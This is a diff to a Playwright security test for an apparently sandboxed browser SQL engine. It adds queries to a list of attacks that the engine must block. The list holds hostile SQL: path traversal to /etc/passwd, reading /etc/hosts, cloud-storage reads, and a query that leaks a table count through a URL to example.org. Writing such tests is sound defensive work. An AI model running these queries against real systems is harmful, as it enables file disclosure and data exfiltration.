@@ -1,4 +1,4 @@
-import { expect, test } from '@playwright/test'
+import { expect, test } from './fixtures'
 import { openDemo, recordEgress, runSql } from './helpers'
 
 /** Queries an attacker might get a user to paste. Every one must fail without any network request. */
@@ -18,6 +18,8 @@ const ATTACKS: [string, string, RegExp][] = [
   ['allow unsigned extensions', 'SET allow_unsigned_extensions = true', /locked/],
   ['path traversal', "SELECT * FROM read_csv_auto('/sheetah/../etc/passwd')", /disabled by configuration/],
   ['read outside the sandbox', "SELECT * FROM read_text('/etc/hosts')", /disabled by configuration/],
+  ['read from cloud storage', "SELECT * FROM read_csv('s3://example-bucket/leak.csv')", /disabled by configuration/],
+  ['leak data inside a URL', "SET VARIABLE leak = (SELECT 'https://example.org/?d=' || count(*) FROM orders); SELECT * FROM read_text(getvariable('leak'))", /disabled by configuration/],
 ]
 
 test.describe('sealed engine', () => {
